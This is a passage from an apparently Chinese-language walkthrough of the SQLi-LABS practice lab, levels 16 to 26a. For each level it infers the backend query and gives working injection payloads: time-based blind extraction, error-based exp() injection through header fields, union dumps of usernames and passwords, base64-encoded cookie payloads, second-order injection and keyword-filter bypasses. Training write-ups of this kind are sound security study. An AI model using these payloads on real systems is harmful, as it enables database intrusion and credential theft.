class="string">&#x27;c&#x27;</span>,<span class="number">1</span>,<span class="number">0</span>)<span class="comment">--+&amp;passwd=&amp;submit=Submit</span></span><br><span class="line">...</span><br><span class="line"># 正确</span><br><span class="line">uname<span class="operator">=</span><span class="string">&#x27;and+1=if(substr((select+group_concat(username)+from+users),2,1)=&#x27;</span>u<span class="string">&#x27;,1,0)--+&amp;passwd=&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>

<h2 id="Less-16-基于盲时间的双引号字符串"><a href="#Less-16-基于盲时间的双引号字符串" class="headerlink" title="Less-16 基于盲时间的双引号字符串"></a>Less-16 基于盲时间的双引号字符串</h2><ul>
<li>根据题目提示我们可以假设该SQL语句为：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column1, column2 <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="operator">=</span> &quot;$username&quot; <span class="keyword">and</span> password <span class="operator">=</span> &quot;$password&quot;;</span><br></pre></td></tr></table></figure>

<ul>
<li>接下来尝试使用<code>&quot;or 1=if(1=1,sleep(3),0)--+</code>，进行注入发现没有延迟效果，应该是我们猜测的SQL语句有问题再次猜测：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column1, column2 <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span>(&quot;&quot;) <span class="keyword">and</span> password <span class="operator">=</span> (&quot;&quot;);</span><br></pre></td></tr></table></figure>

<ul>
<li>尝试使用<code>&quot;)or 1=if(1=1,sleep(3),0)--+</code>，发现注入成功。接下来尝试使用下列语句：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 查询第一位数据</span><br><span class="line"># 错误</span><br><span class="line">uname<span class="operator">=</span>&quot;)or+1=if(substr((select group_concat(username) from users),1,1)=&#x27;a&#x27;,sleep(3),0)--+&amp;passwd=&amp;submit=Submit</span><br><span class="line"># 错误</span><br><span class="line">uname=&quot;)<span class="keyword">or</span><span class="operator">+</span><span class="number">1</span><span class="operator">=</span>if(substr((<span class="keyword">select</span> group_concat(username) <span class="keyword">from</span> users),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;b&#x27;</span>,sleep(<span class="number">3</span>),<span class="number">0</span>)<span class="comment">--+&amp;passwd=&amp;submit=Submit</span></span><br><span class="line">...</span><br><span class="line"># 正确</span><br><span class="line">uname<span class="operator">=</span>&quot;)or+1=if(substr((select group_concat(username) from users),1,1)=&#x27;d&#x27;,sleep(3),0)--+&amp;passwd=&amp;submit=Submit</span><br><span class="line"></span><br><span class="line"># 查询第二位数据</span><br><span class="line"># 错误</span><br><span class="line">uname=&quot;)<span class="keyword">or</span><span class="operator">+</span><span class="number">1</span><span class="operator">=</span>if(substr((<span class="keyword">select</span> group_concat(username) <span class="keyword">from</span> users),<span class="number">2</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;a&#x27;</span>,sleep(<span class="number">3</span>),<span class="number">0</span>)<span class="comment">--+&amp;passwd=&amp;submit=Submit</span></span><br><span class="line"># 错误</span><br><span class="line">uname<span class="operator">=</span>&quot;)or+1=if(substr((select group_concat(username) from users),2,1)=&#x27;b&#x27;,sleep(3),0)--+&amp;passwd=&amp;submit=Submit</span><br><span class="line"># 错误</span><br><span class="line">uname=&quot;)<span class="keyword">or</span><span class="operator">+</span><span class="number">1</span><span class="operator">=</span>if(substr((<span class="keyword">select</span> group_concat(username) <span class="keyword">from</span> users),<span class="number">2</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;c&#x27;</span>,sleep(<span class="number">3</span>),<span class="number">0</span>)<span class="comment">--+&amp;passwd=&amp;submit=Submit</span></span><br><span class="line">...</span><br><span class="line"># 正确</span><br><span class="line">uname<span class="operator">=</span>&quot;)or+1=if(substr((select group_concat(username) from users),2,1)=&#x27;u&#x27;,sleep(3),0)--+&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure>

<h2 id="Less-17-更新查询基于错误字符串"><a href="#Less-17-更新查询基于错误字符串" class="headerlink" title="Less-17 更新查询基于错误字符串"></a>Less-17 更新查询基于错误字符串</h2><ul>
<li>假设该更新语句为：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> <span class="keyword">table</span> <span class="keyword">set</span> password <span class="operator">=</span> <span class="string">&#x27;$password&#x27;</span> <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;$username&#x27;</span> limit <span class="number">0</span>, <span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>根据上面猜测的语句无法进行注入。然后我就憋住去看了一下源代码。发现username进行过滤了，没办法注入然后我就打算在password中进行注入。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">123456</span><span class="string">&#x27;+where+1=exp(~(select+*+from+(select+group_concat(table_name)+from+information_schema.tables+where+table_schema=database())a))--+&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>

<ul>
<li>这里我们利用报错注入来获取数据。</li>
</ul>
<p><img src="/../../images/SQLi-LABS/image-20210928202630702.png" alt="image-20210928202630702"></p>
<h2 id="Less-18-标头注入基于错误字符串"><a href="#Less-18-标头注入基于错误字符串" class="headerlink" title="Less-18 标头注入基于错误字符串"></a>Less-18 标头注入基于错误字符串</h2><ul>
<li>首先我这里输入了正确的信息，页面会返回User-Agent。然后根据题目提示注入点在header头，返回根据页面的user-agent，可以推断出应该是在user-agent存在注入点。</li>
</ul>
<p><img src="/../../images/SQLi-LABS/image-20210929095246337.png" alt="image-20210929095246337"></p>
<ul>
<li>在user-agent单引号以后出现错误。我们可以推断这是保存用户登录的SQL语句。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">table</span> (..., `<span class="keyword">user</span><span class="operator">-</span>agent`, `ip`, `username`) <span class="keyword">values</span> (..., <span class="string">&#x27;user-agent&#x27;</span>, <span class="string">&#x27;ip&#x27;</span>, <span class="string">&#x27;username&#x27;</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>因为这里是使用插入语句我们应该使用报错注入。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bbb<span class="string">&#x27;,&#x27;</span><span class="number">123131</span><span class="string">&#x27;,exp(~(select * from (select group_concat(table_name) from information_schema.tables where table_schema=database())a)))-- &#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="/../../images/SQLi-LABS/image-20210929101511873.png" alt="image-20210929101511873"></p>
<h2 id="Less-19-标头注入Referer基于错误的字符串"><a href="#Less-19-标头注入Referer基于错误的字符串" class="headerlink" title="Less-19 标头注入Referer基于错误的字符串"></a>Less-19 标头注入Referer基于错误的字符串</h2><ul>
<li>根据题目提示，我们可以从Referer进行注入。尝试在Referer值设置为单引号，会出现下列错误。</li>
</ul>
<p><img src="/../../images/SQLi-LABS/image-20210929102339731.png" alt="image-20210929102339731"></p>
<ul>
<li>根据错误提示，我们可以推断出该语句为：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">table</span> (..., `referer`, `ip`) <span class="keyword">values</span> (..., <span class="string">&#x27;referer&#x27;</span>, <span class="string">&#x27;ip&#x27;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>使用下列语句进行注入：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">123</span><span class="string">&#x27;,exp(~(select * from (select group_concat(table_name) from information_schema.tables where table_schema=database())a)))-- &#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="/../../images/SQLi-LABS/image-20210929103520548.png" alt="image-20210929103520548"></p>
<h2 id="Less-20-Cookie注入基于错误字符串"><a href="#Less-20-Cookie注入基于错误字符串" class="headerlink" title="Less-20 Cookie注入基于错误字符串"></a>Less-20 Cookie注入基于错误字符串</h2><ul>
<li>根据题目提示我们要先登录账号后才可以使用cookie来获取用户信息。</li>
</ul>
<p><img src="/../../images/SQLi-LABS/image-20210929105835013.png" alt="image-20210929105835013"></p>
<ul>
<li>使用BurpSuite抓登录完成的包，然后修改Cookie中的值在后面加上单引号。</li>
</ul>
<p><img src="/../../images/SQLi-LABS/image-20210929110115981.png" alt="image-20210929110115981"></p>
<ul>
<li>根据错误信息我们可以推断出该语句为：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column1, ... <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> cookie <span class="operator">=</span> <span class="string">&#x27;$cookie&#x27;</span> limit <span class="number">0</span>, <span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>使用<code>Cookie: uname=&#39; or 1=1 --+</code>，发现注册成功然后使用<code>order by</code>关键字猜字段。</li>
<li>已经找到注入点了可以参考Less-1的解法。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname<span class="operator">=</span><span class="string">&#x27; union select 1,(select group_concat(username) from users),(select group_concat(password) from users) --+</span></span><br></pre></td></tr></table></figure>

<p><img src="/../../images/SQLi-LABS/image-20210929111046256.png" alt="image-20210929111046256"></p>
<h2 id="Less-21-Cookie注入基于字符串错误-复杂"><a href="#Less-21-Cookie注入基于字符串错误-复杂" class="headerlink" title="Less-21 Cookie注入基于字符串错误-复杂"></a>Less-21 Cookie注入基于字符串错误-复杂</h2><ul>
<li>这里和Less-20一样需要登录。登录成功后我们可以在BurpSuite中查看请求的数据包。这里发现返回的Cookie给加密了，在BurpSuite可以查看到明文。</li>
</ul>
<p><img src="/../../images/SQLi-LABS/image-20211016203215779.png" alt="image-20211016203215779"></p>
<ul>
<li><p>可以在右侧看到这里使用了URL和Base64进行加密。接下来我们就使用<code>ctrl+r</code>快捷键打开Repeater&#96;功能。</p>
</li>
<li><p>然后我们将Cookie中的<code>uname</code>的值改为<code>YWRtaW4n</code>。然后发送会出现下面的错误。</p>
</li>
</ul>
<p><img src="/../../images/SQLi-LABS/image-20211016203858719.png" alt="image-20211016203858719"></p>
<ul>
<li>这里我们可以猜测该SQL语句可能为：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column1, column2, ... form <span class="keyword">table</span> <span class="keyword">where</span> cookie <span class="operator">=</span> (<span class="string">&#x27;$cookie&#x27;</span>) limit <span class="number">0</span>, <span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>现在我们就要开始构造payload进行攻击了。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">YWRtaW4nKSAtLSA<span class="operator">=</span></span><br><span class="line"># 上面内容不懂是什么可以看右侧。解密后的数据。</span><br></pre></td></tr></table></figure>

<p><img src="/../../images/SQLi-LABS/image-20211016205711586.png" alt="image-20211016205711586"></p>
<ul>
<li>接下来把Less-20的payload改一下就可以了。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JykgdW5pb24gc2VsZWN0IDEsKHNlbGVjdCBncm91cF9jb25jYXQodXNlcm5hbWUpIGZyb20gdXNlcnMpLChzZWxlY3QgZ3JvdXBfY29uY2F0KHBhc3N3b3JkKSBmcm9tIHVzZXJzKSAtLSA<span class="operator">=</span></span><br></pre></td></tr></table></figure>

<p><img src="/../../images/SQLi-LABS/image-20211016210451296.png" alt="image-20211016210451296"></p>
<ul>
<li>注意这里最后不能使用<code>--+</code>而是使用<code>-- </code>如果不使用空格会无法进行注入。</li>
</ul>
<h2 id="Less-22-Cookie注入-基于字符串错误-双引号"><a href="#Less-22-Cookie注入-基于字符串错误-双引号" class="headerlink" title="Less-22 Cookie注入-基于字符串错误-双引号"></a>Less-22 Cookie注入-基于字符串错误-双引号</h2><ul>
<li>这题第一步和Less-20和Less-21一样。登录后的响应包和Less-21一样都进行加密处理，解密方式和Less-21一样。根据提示的提示这里我将Less-21的单引号替换成双引号。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YWRtaW4i</span><br></pre></td></tr></table></figure>

<p><img src="/../../images/SQLi-LABS/image-20211016212648244.png" alt="image-20211016212648244"></p>
<ul>
<li>根据错误信息我们可以尝试推断出该SQL语句。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column1, ... <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> cookie <span class="operator">=</span> &quot;$cookie&quot; limit <span class="number">0</span>, <span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>接下来开始构造payload进行注入。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YWRtaW4iIGFuZCAxPTEgLS0g</span><br></pre></td></tr></table></figure>

<p><img src="/../../images/SQLi-LABS/image-20211016212116737.png" alt="image-20211016212116737"></p>
<ul>
<li>注入成功，接下来我们获取所有用户数据。这里我们可以从Less-21的payload修改一下。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IiB1bmlvbiBzZWxlY3QgMSwoc2VsZWN0IGdyb3VwX2NvbmNhdCh1c2VybmFtZSkgZnJvbSB1c2VycyksKHNlbGVjdCBncm91cF9jb25jYXQocGFzc3dvcmQpIGZyb20gdXNlcnMpIC0tIA<span class="operator">=</span><span class="operator">=</span></span><br></pre></td></tr></table></figure>

<p><img src="/../../images/SQLi-LABS/image-20211016212518245.png" alt="image-20211016212518245"></p>
<h2 id="Less-23-基于错误-无评论"><a href="#Less-23-基于错误-无评论" class="headerlink" title="Less-23 基于错误-无评论"></a>Less-23 基于错误-无评论</h2><ul>
<li>打开页面提示我们需要传入id，这里我传入了id的值为1可以正常返回页面。尝试在1后面添加单引号就出现了错误。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error <span class="keyword">in</span> your <span class="keyword">SQL</span> syntax; <span class="keyword">check</span> the manual that corresponds <span class="keyword">to</span> your MySQL server version <span class="keyword">for</span> the <span class="keyword">right</span> syntax <span class="keyword">to</span> use near <span class="string">&#x27;&#x27;</span><span class="number">1</span><span class="string">&#x27;&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span><span class="string">&#x27; at line 1</span></span><br></pre></td></tr></table></figure>

<ul>
<li>我们可以从错误信息推断出该SQL语句为：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column1, column2, ... form <span class="keyword">table</span> <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;$id&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>经过测试发现以前的方法都无法使用，这时候我们就需要打开源代码查看。</li>
</ul>
<p><img src="/../../images/SQLi-LABS/image-20211025173349489.png" alt="image-20211025173349489"></p>
<ul>
<li>代码对我们的payload进行了处理。这里不能使用MySQL的注释。我们可以使用闭合SQL语句。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 正常返回数据</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;+and+&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line"># 返回空数据</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;+and+&#x27;</span><span class="number">2</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>

<ul>
<li>猜字段，因为不能使用<code>order by</code>关键字，我们就只能使用<code>union select null,...</code>语句来猜测数据。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 我们可以发现返回的数据中只有两个地方会进行变化，我们就可以先从两个<span class="keyword">null</span>开始。</span><br><span class="line">?id<span class="operator">=</span><span class="string">&#x27;+union+select+null,null&#x27;</span> # The used <span class="keyword">SELECT</span> statements have a different number <span class="keyword">of</span> columns</span><br><span class="line">?id<span class="operator">=</span><span class="string">&#x27;+union+select+null,null,null&#x27;</span> # 正确</span><br></pre></td></tr></table></figure>

<ul>
<li>接下来我们就需要获取所有数据。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="string">&#x27;union+select+1,(select+group_concat(username)+from+users),(select+group_concat(password)+from+users)&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="/../../images/SQLi-LABS/image-20211025194230601.png" alt="image-20211025194230601"></p>
<h2 id="Less-24-二级注射"><a href="#Less-24-二级注射" class="headerlink" title="Less-24 二级注射"></a>Less-24 二级注射</h2><ul>
<li>打开题目页面会返回一个登录表单，我们尝试使用<code>admin</code>账号进行登录，登录后会进入一个修改密码页面。</li>
<li>在登录页面测试以后发现有过滤规则，这时候我们就需要使用查看源代码。</li>
<li>在该题目目录下发现有下列文件：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@6220105599eb:/var/www/html/Less-24<span class="comment"># ls -l</span></span><br><span class="line">total 36</span><br><span class="line">-rwxr-xr-x 1 root root  242 Dec 16  2015 Logged-in.php</span><br><span class="line">-rwxr-xr-x 1 root root  530 Dec 16  2015 failed.php</span><br><span class="line">-rwxr-xr-x 1 root root  390 Dec 16  2015 forgot_password.php</span><br><span class="line">-rwxr-xr-x 1 root root 1678 Dec 16  2015 index.php</span><br><span class="line">-rwxr-xr-x 1 root root 1774 Dec 16  2015 logged-in.php</span><br><span class="line">-rwxr-xr-x 1 root root 1261 Dec 16  2015 login.php</span><br><span class="line">-rwxr-xr-x 1 root root 1955 Dec 16  2015 login_create.php</span><br><span class="line">-rwxr-xr-x 1 root root 1736 Dec 16  2015 new_user.php</span><br><span class="line">-rwxr-xr-x 1 root root 1571 Dec 16  2015 pass_change.php</span><br></pre></td></tr></table></figure>

<ul>
<li>查看所有文件以后该页面的流程如下：</li>
</ul>
<p><img src="/../../images/SQLi-LABS/less-24.png" alt="less-24"></p>
<ul>
<li>查看代码后发现<code>pass_change.php</code>文件<code>username</code>没有使用过滤函数，其他文件都有使用过滤函数。</li>
</ul>
<p><img src="/../../images/SQLi-LABS/image-20211025205559637.png" alt="image-20211025205559637"></p>
<ul>
<li>查看该题目的所有代码以后我发现我们没有办法获取所有数据，只可以修改信息。</li>
<li>我们可以尝试在这里进行注入，现在遇到一个问题我们要如何修改SESSION。<ul>
<li>这里我们可以通过创建新用户执行我们设置的SQL语句。</li>
<li>这里我们创建了一个用户名：<code>-- </code>的用户。</li>
<li>下一步我们就需要使用该用户进行登录，登录后我们就需要去修改该用户密码，因为这里的username没有使用过滤函数。</li>
<li>提交后会出现下列错误页面。</li>
</ul>
</li>
</ul>
<p><img src="/../../images/SQLi-LABS/image-20211025212159786.png" alt="image-20211025212159786"></p>
<ul>
<li>根据该错误页面我们可以断定我们注入成功。</li>
<li>接下来我们需要使用修改SESSON。<ul>
<li>首先创建一个payload的用户。如：<code>admin &#39; #&#39;</code>。这个payload是修改admin密码。</li>
<li>创建新用户以后我们进行修改密码。</li>
<li>修改成功以后我们就可以登录admin账号。</li>
</ul>
</li>
</ul>
<h2 id="Less-25-用OR-amp-AND欺骗"><a href="#Less-25-用OR-amp-AND欺骗" class="headerlink" title="Less-25 用OR&amp;AND欺骗"></a>Less-25 用OR&amp;AND欺骗</h2><ul>
<li><p>根据页面提示在链接添加一个属性和值：id&#x3D;1。正常返回数据。</p>
</li>
<li><p>判断该SQL语句的类型。</p>
<ul>
<li>使用在id值后面添加单引号。</li>
<li>出现错误信息，可以推断出该SQL语句为字符串类型。</li>
</ul>
</li>
<li><p>猜测该SQL语句。</p>
<ul>
<li>首先使用<code>order by</code>猜测该字段的数量，输入以后发生了错误。</li>
</ul>
<p><img src="/../../images/SQLi-LABS/image-20211025224319325.png" alt="image-20211025224319325"></p>
<ul>
<li><p>导致错误的原因是因为<code>order by</code>包含了<code>or</code>所以给过滤了。</p>
<ul>
<li>我们可以使用双重<code>or</code>进行绕过。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 注意<span class="comment">-- 后面的空格。</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; order by 3 -- </span></span><br></pre></td></tr></table></figure>

<p><img src="/../../images/SQLi-LABS/image-20211025224638599.png" alt="image-20211025224638599"></p>
</li>
</ul>
</li>
<li><p>根据目前得到的数据我们可以推断出该SQL语句为：</p>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column1, column2, column3 form <span class="keyword">table</span> <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;$id&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>接下来我们需要获取所有的数据（查询该数据库中的所有表和所有列这里就不进行演示了）。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">&#x27; union select 1,(select group_concat(username) from users),(select group_concat(passwoorrd) from users) --</span></span><br></pre></td></tr></table></figure>

<p><img src="/../../images/SQLi-LABS/image-20211025225050527.png" alt="image-20211025225050527"></p>
<h2 id="Less-25a-用OR-amp-AND欺骗"><a href="#Less-25a-用OR-amp-AND欺骗" class="headerlink" title="Less-25a 用OR&amp;AND欺骗"></a>Less-25a 用OR&amp;AND欺骗</h2><ul>
<li>根据页面提示在链接添加一个属性和值：id&#x3D;1。正常返回数据。</li>
<li>判断该SQL语句的类型。<ul>
<li>使用在id值后面添加单引号，返回页面数据为空，可以推断出该SQL语句类型为数值。</li>
</ul>
</li>
<li>接下来我们直接获取所有的数据，这里和Less-25区别不大（查询该数据库中的所有表和所有列这里就不进行演示了）。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(username) <span class="keyword">from</span> users),(<span class="keyword">select</span> group_concat(passwoorrd) <span class="keyword">from</span> users) <span class="comment">--</span></span><br></pre></td></tr></table></figure>

<p><img src="/../../images/SQLi-LABS/image-20211025225928644.png" alt="image-20211025225928644"></p>
<h2 id="Less-26-Trick-with-comments"><a href="#Less-26-Trick-with-comments" class="headerlink" title="Less-26 Trick with comments"></a>Less-26 Trick with comments</h2><ul>
<li>判断该数据SQL语句的类型经过尝试。发现该SQL语句类型为字符串类型。</li>
<li>经过多次尝试以后发现该SQL语句有进行过滤处理，这时候我们就需要查看源代码。</li>
<li>发现了过滤函数。</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);                     <span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">        <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/and/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);            <span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">    	<span class="comment"># 下面的代码都是在过滤空格</span></span><br><span class="line">        <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);          <span class="comment">//strip out /*</span></span><br><span class="line">        <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);            <span class="comment">//Strip out --</span></span><br><span class="line">        <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);                     <span class="comment">//Strip out #</span></span><br><span class="line">        <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\s]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);            <span class="comment">//Strip out spaces</span></span><br><span class="line">        <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\\\\]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);                <span class="comment">//Strip out slashes</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>因为这里过滤空格和注释。我没有办法进行报错注入，这里只能用布尔和时间延迟方法进行注入。</p>
<ul>
<li>这里我使用时间延迟方法进行注入。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 为什么要用aandnd，因为preg_replace()函数不会进行多次过滤</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;aandnd(if(substring(user(),1,1)=char(114),sleep(3),0))=&#x27;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>剩下的步骤我这里就不进行详细说明。你可以去查看Less-10的步骤。</li>
</ul>
</li>
</ul>
<h2 id="Less-26a-Trick-with-comments"><a href="#Less-26a-Trick-with-comments" class="headerlink" title="Less-26a Trick with comments"></a>Less-26a Trick with comments</h2><ul>
<li>查看源代码后发现Less-26a和Less-26区别不大只是在SQL语句添加了<code>()</code>。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># <span class="number">26</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="string">&#x27;$id&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span>;</span><br><span class="line"># <span class="number">26</span>a</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id<span class="operator">=</span>(<span class="string">&#x27;$id&#x27;</span>) LIMIT <span class="number">0</span>,<span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>我们只需要修改一下Less-26的payload就可以了。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;)aandnd(if(substring(user(),1,1)=char(114),sleep(3),0))=(&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="Less-27与SELECT-amp-UNION的绕过"><a href="#Less-27与SELECT-amp-UNION的绕过" class="headerlink" title="Less-27与SELECT&amp;UNION的绕过"></a>Less-27与SELECT&amp;UNION的绕过</h2><ul>
